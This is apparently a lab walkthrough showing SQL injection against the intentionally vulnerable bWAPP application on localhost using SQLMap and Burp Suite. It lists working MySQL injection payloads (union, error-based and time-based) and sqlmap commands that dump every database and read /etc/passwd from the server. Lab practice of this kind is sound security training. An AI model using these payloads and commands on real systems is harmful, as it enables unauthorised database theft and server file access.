<h1 align="center"> SQLMap For SQL Injection </h1>

<img width="1200" height="842" alt="image" src="https://media.licdn.com/dms/image/v2/D5612AQEpNR5Xs_2AAg/article-cover_image-shrink_600_2000/article-cover_image-shrink_600_2000/0/1677916186269?e=2147483647&v=beta&t=hfF128B1HCQsL30eoRBoveZk1-pcHQbjYh5g1G8EyOk" />


## Scope:
- **Attacker**: Kali Linux (k4n0ng)
- **Victim**: bWAPP (http://localhost:1010/sqli_6.php)


## LAB TOOLS
- SQLMap
- Burp Suite


# SQL Map For SQL Injection:

- In this we test target with this: http://localhost:1010/portal.php
<img width="1859" height="842" alt="image" src="https://github.com/user-attachments/assets/e3c6736d-f104-4c46-9d46-effae49967cb" />

- In target:
<img width="1828" height="972" alt="image" src="https://github.com/user-attachments/assets/3efd5986-3d10-40f5-b1f7-ae29d41ba337" />

<img width="1757" height="801" alt="image" src="https://github.com/user-attachments/assets/d0d05223-c098-470d-9a51-ac4ba3c667c4" />

<img width="1799" height="593" alt="image" src="https://github.com/user-attachments/assets/64edc6f1-8973-486c-8940-bb6ad100c9a3" />

- Now we see this.


## Installation

- In this i use `SQLMap` in my windows, so i need to install it:
````
sudo apt install sqlmap -y
````
<img width="1144" height="849" alt="image" src="https://github.com/user-attachments/assets/725a973a-c3f7-4b83-95dc-b6663bc7d559" />

### In this i need to find `Parameters`:
- In this i try to input Injection and i find if i input letter `h`:
<img width="1756" height="759" alt="image" src="https://github.com/user-attachments/assets/e6066adf-4b58-4c58-9c27-1fdebb29bcbf" />


- So we can use `SQLMap`.


## Test tittle parameter:
- In this i want to test with this command:
````
sqlmap -u "http://localhost:1010/sqli_6.php" --data="title=ironman&action=search" -p title --batch
````
<img width="1902" height="987" alt="image" src="https://github.com/user-attachments/assets/e5914e97-8d59-43b1-bbbf-8dce1a106efe" />

- Not in this it failed.

- I test with session cookie.


## Test with session cookie:
To find session cookie:
- Go to our target -> `Righ click` on it -> select `Inspect` or we can press `F12`:
<img width="1793" height="796" alt="image" src="https://github.com/user-attachments/assets/2dd6235d-f07a-4e76-8d25-b22d3459b3dd" />

````
document.cookie
````
<img width="1858" height="567" alt="image" src="https://github.com/user-attachments/assets/64fea34f-cdfb-4ecc-a335-18e98e7e2dfc" />

- Now we found the session cookie: `c3v70ge1asjv77g94ts0e3b5c1`

````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch
````
<img width="1903" height="895" alt="image" src="https://github.com/user-attachments/assets/c4386c69-c816-43d8-8642-3140475faa25" />

<img width="1907" height="568" alt="image" src="https://github.com/user-attachments/assets/df89aef9-a73c-4902-a48c-432c2400c2e3" />

- Now we found `Payload`.
- `-u`: Target URL.
- `--data`: POST body parameters
- `-p tittle`: Specifies `tittle` as the injection point
- `--batch`: Runs non-interactively with default answers




- If i test to upload:
In this i use it in burp:
<img width="1396" height="376" alt="image" src="https://github.com/user-attachments/assets/ba94c6f4-ad44-4752-a44e-28149bb17117" />

<img width="1227" height="627" alt="image" src="https://github.com/user-attachments/assets/0e36c52c-dd07-44bb-979b-d8f663d44b30" />

- After back to our `Burp`:
<img width="1919" height="897" alt="image" src="https://github.com/user-attachments/assets/98541c70-afbc-47e0-be68-c683c192d08e" />

- Press `Ctrl + R`:
<img width="1918" height="830" alt="image" src="https://github.com/user-attachments/assets/0bbbcaaf-9b6f-4b30-8701-688a39ecc042" />

<img width="1918" height="913" alt="image" src="https://github.com/user-attachments/assets/b644f75e-77b8-4f98-b627-eb5924725bf4" />

<img width="748" height="610" alt="image" src="https://github.com/user-attachments/assets/5dc0318d-89b6-42d3-aa49-973361ef97f1" />

- Change `h` to `h%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170717a71,0x49584c587246737750485368644453534479495064665272666441474a684451727247614758735a,0x716b7a6271),NULL#` 

<img width="1918" height="885" alt="image" src="https://github.com/user-attachments/assets/76dc7bcb-640a-4817-92e1-c01a0ea57c1d" />

<img width="1919" height="954" alt="image" src="https://github.com/user-attachments/assets/8c69e480-1cca-4956-9f43-939233323f6f" />

- Now we got successful.

- Payload that we can use:
````
h%' AND 3356=3356
h%' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7170717a71,(SELECT (ELT(6815=6815,1))),0x716b7a6271,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'ryik%'='ryik
h%' AND (SELECT 2686 FROM (SELECT(SLEEP(5)))Uauh) AND 'tqsC%'='tqsC
h%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170717a71,0x49584c587246737750485368644453534479495064665272666441474a684451727247614758735a,0x716b7a6271),NULL#
````
---


## Check if Injection was Found
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch --flush-session -v 3
````
<img width="1914" height="1014" alt="image" src="https://github.com/user-attachments/assets/f43e327e-dedd-4d90-90cf-e91505124883" />

<img width="1911" height="935" alt="image" src="https://github.com/user-attachments/assets/cdd39643-c52d-4c1d-b581-4e325e7c44d2" />

<img width="1884" height="994" alt="image" src="https://github.com/user-attachments/assets/d6739dcd-013e-4be4-ab3f-126eaac4d45c" />

<img width="1897" height="766" alt="image" src="https://github.com/user-attachments/assets/c5f3f026-4b1d-4afa-bda2-803e6f866582" />

<img width="1897" height="961" alt="image" src="https://github.com/user-attachments/assets/5246874f-c0b5-4711-9af7-6eac6c867265" />

- `--cookie`: Auth/session persistence.
- `--data`: POST body parameters
- `--flush-session`: Clears previous scan data
- `-v 3`: Verbose output (request/response headers + payloads)


## Get Database Information
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch --current-db
````
<img width="1913" height="918" alt="image" src="https://github.com/user-attachments/assets/4265c0f5-19ab-4336-80a9-5f9e5d3c05d7" />

- Now we see current database name `bWAPP`.
- `current-db`: Extracts the name of the current database in use





## List All Databases
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch --dbs
````
<img width="1915" height="1012" alt="image" src="https://github.com/user-attachments/assets/a52cf629-9e9b-4882-9b99-41229fa4c5eb" />


- `--dbs`: databases.

---


## Get Database Tables
### Current database
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch --tables
````
<img width="1914" height="803" alt="image" src="https://github.com/user-attachments/assets/e7ce277d-a922-4187-8287-18b8e0a2a774" />

<img width="1115" height="883" alt="image" src="https://github.com/user-attachments/assets/ee5cf054-994a-44a2-8b5c-b3cc4aa4b672" />

<img width="927" height="976" alt="image" src="https://github.com/user-attachments/assets/4acb4578-dc04-4a0e-ac7e-04970e1f54b0" />

- `--tables`: Enumerates all tables in the current database


### Specific Database
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch -D bWAPP --tables
````
<img width="1904" height="947" alt="image" src="https://github.com/user-attachments/assets/fc9f7e1b-8183-4411-9e2e-f0ffcef86d43" />

- `-D bWAPP` : Specific the target database name (`bWAPP`).

---

## Extract Data from Tables
### Get Table Columns
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch -D bWAPP -T blog --columns
````
<img width="1916" height="707" alt="image" src="https://github.com/user-attachments/assets/4d50e2f1-360f-4559-ba53-fecaff293ca4" />

<img width="1901" height="985" alt="image" src="https://github.com/user-attachments/assets/f6ea130a-261c-4cf9-bbaf-3d9b2ca535cf" />

- `-T blog`: Specifies the target table (`blog`)
- `--columns`: Lists all column names and types in the `blog` table


### Dump Table Contents

- Dump specific table
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch -D bWAPP -T blog --dump
````
<img width="1886" height="900" alt="image" src="https://github.com/user-attachments/assets/039e7b95-d28f-4797-8899-f69d54d7f4eb" />

- `--dump`: Extracts and displays all data from the table.


- Dump all tables from database
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch -D bWAPP --dump-all
````
<img width="1914" height="842" alt="image" src="https://github.com/user-attachments/assets/c602a0ae-b6f1-4912-a8c7-623fae797017" />

<img width="1477" height="661" alt="image" src="https://github.com/user-attachments/assets/3fa040c9-0689-47d9-868c-b44bb860ad8f" />

<img width="1110" height="607" alt="image" src="https://github.com/user-attachments/assets/03002b8c-3f6e-4846-b027-532b9f05b386" />

---



## Advanced Enumeration


### Get Database Users and Privileges

#### Get current user
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch --current-user
````
<img width="1901" height="906" alt="image" src="https://github.com/user-attachments/assets/9953507d-a511-4071-85c1-a12d444663d8" />


#### Get all users
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch --users
````
<img width="1908" height="995" alt="image" src="https://github.com/user-attachments/assets/7a9c802b-834e-4c2d-a703-58d3bb009d07" />


#### Get privileges
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1"  --data="title=h&action=search" -p title --batch --privileges
````
<img width="1914" height="804" alt="image" src="https://github.com/user-attachments/assets/d62c6513-8db6-45ea-8030-c8a30fa2e2a5" />

<img width="1200" height="904" alt="image" src="https://github.com/user-attachments/assets/ece81b91-f459-43d9-8c4f-7503a9c3e842" />

<img width="894" height="941" alt="image" src="https://github.com/user-attachments/assets/3b0f618f-4401-491e-a248-cb1ad1648f1f" />

- `--privileges`: Extracts all privileges assigned to the current DBMS user.

---



## Comprehensive Attack
### Full Database Dump
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch --dump-all --exclude-sysdbs
````
<img width="1905" height="908" alt="image" src="https://github.com/user-attachments/assets/2b1e1ce0-b48a-4316-b928-373ef2470bef" />

<img width="1241" height="1021" alt="image" src="https://github.com/user-attachments/assets/1f955c0f-9760-45c4-8094-a6d15fbdc391" />

- `dump-all`: Dumps all data from all tables in all databases
- `--execude-sysd`: Skips system databases like `information_schema`, `mysql`, `performance_schema`.


### OS and File System Access (If privileges allow)
#### Check if file read is possible
````
sqlmap -u "http://localhost:1010/sqli_6.php" --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" --data="title=h&action=search" -p title --batch --file-read="/etc/passwd"
````
<img width="1895" height="733" alt="image" src="https://github.com/user-attachments/assets/67c89ad5-d9a9-4824-84e6-adf87c8ca900" />

- `--file-read="/etc/passwd"`: Attempts to read the file `/etc/passwd` from the server.


## ptimized Single Command
````
sqlmap -u "http://localhost:1010/sqli_6.php" \
  --cookie="security_level=0; PHPSESSID=c3v70ge1asjv77g94ts0e3b5c1" \
  --data="title=h&action=search" \
  -p title \
  --batch \
  --level=5 \
  --risk=3 \
  --dbs \
  --tables \
  --current-db \
  --current-user
````
<img width="1894" height="913" alt="image" src="https://github.com/user-attachments/assets/33cc1d30-c4ae-4f7c-984e-b32fe6e85514" />

<img width="1200" height="838" alt="image" src="https://github.com/user-attachments/assets/99de1792-1a8d-4a9a-bcf6-a71ff4b5d0fe" />

<img width="1200" height="824" alt="image" src="https://github.com/user-attachments/assets/30256d9e-4368-41cf-a89c-ae9e27ec459c" />

---


<h2 align="center"> Finished OF SQLMap For SQL Injection </h2>


<h2 align="center"> Credit By: Nin Kanong (k4n0ng) </h2>

<h2 align="center"> Date: 18/11/2025 </h2>
